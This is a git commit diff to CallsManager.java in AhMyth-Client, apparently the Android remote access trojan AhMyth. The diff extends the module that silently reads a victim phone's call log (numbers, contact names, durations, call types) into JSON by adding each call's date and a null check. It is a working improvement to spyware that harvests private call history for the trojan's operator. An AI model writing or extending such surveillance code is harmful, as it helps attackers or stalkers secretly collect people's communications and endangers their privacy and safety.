c3ed20b4c61616a0c1b95fe0c525b2b39e61c10c
TestinginKali <kalitestaryan@gmail.com>
2026-02-06 11:44:37 +0530

    Update CallsManager.java
    Added Date and time called

--- AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/CallsManager.java
+++ AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/CallsManager.java
@@ -10,6 +10,7 @@ import org.json.JSONObject;
 
 /**
  * Created by AhMyth on 11/11/16.
+ * Updated for Timestamp Support 2026
  */
 
 public class CallsManager {
@@ -23,21 +24,31 @@ public class CallsManager {
             Uri allCalls = Uri.parse("content://call_log/calls");
             Cursor cur = MainService.getContextOfApplication().getContentResolver().query(allCalls, null, null, null, null);
 
-            while (cur.moveToNext()) {
-                JSONObject call = new JSONObject();
-                String num = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));// for  number
-                String name = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME));// for name
-                String duration = cur.getString(cur.getColumnIndex(CallLog.Calls.DURATION));// for duration
-                int type = Integer.parseInt(cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE)));// for call type, Incoming or out going.
+            if (cur != null) {
+                while (cur.moveToNext()) {
+                    JSONObject call = new JSONObject();
+                    
+                    String num = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));
+                    String name = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME));
+                    String duration = cur.getString(cur.getColumnIndex(CallLog.Calls.DURATION));
+                    int type = Integer.parseInt(cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE)));
+                    
+                    // NEW: Extract the timestamp (milliseconds since 1970)
+                    long date = cur.getLong(cur.getColumnIndex(CallLog.Calls.DATE));
 
-
-                call.put("phoneNo", num);
-                call.put("name", name);
-                call.put("duration", duration);
-                call.put("type", type);
-                list.put(call);
-
+                    call.put("phoneNo", num);
+                    call.put("name", name);
+                    call.put("duration", duration);
+                    call.put("type", type);
+                    
+                    // NEW: Add the date to the JSON object
+                    call.put("date", date); 
+                    
+                    list.put(call);
+                }
+                cur.close(); // Good practice to close the cursor
             }
+            
             Calls.put("callsList", list);
             return Calls;
         } catch (JSONException e) {
